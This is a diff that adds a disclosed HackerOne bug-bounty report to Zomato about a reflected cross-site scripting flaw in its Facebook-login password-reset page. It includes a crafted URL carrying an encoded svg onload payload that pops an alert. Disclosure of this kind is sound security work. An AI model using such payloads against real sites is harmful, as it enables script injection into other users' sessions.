@@ -1,0 +1,17 @@
+ReportLink:https://hackerone.com/reports/114151
+WeaknessName:Cross-site Scripting (XSS) - Generic
+Reporter:https://hackerone.com/imbecile
+ReportedTo:Zomato(zomato)
+BountyAmount:
+Severity:
+State:Closed
+DateOfDisclosure:06.03.2016 8:49:31
+
+Summary:
+
+Hello,
+
+Please find below crafted URL to reproduce the reflected XSS:
+> https://www.zomato.com/php/fb_login_pass_reset?type=%22%3E%3Csvg/onload=alert%28document.domain%29%3E%3Ch1%3EBoooooya!!%3C/h1%3E
+
+Access above URL (Tested on Firefox) to reproduce the issue.
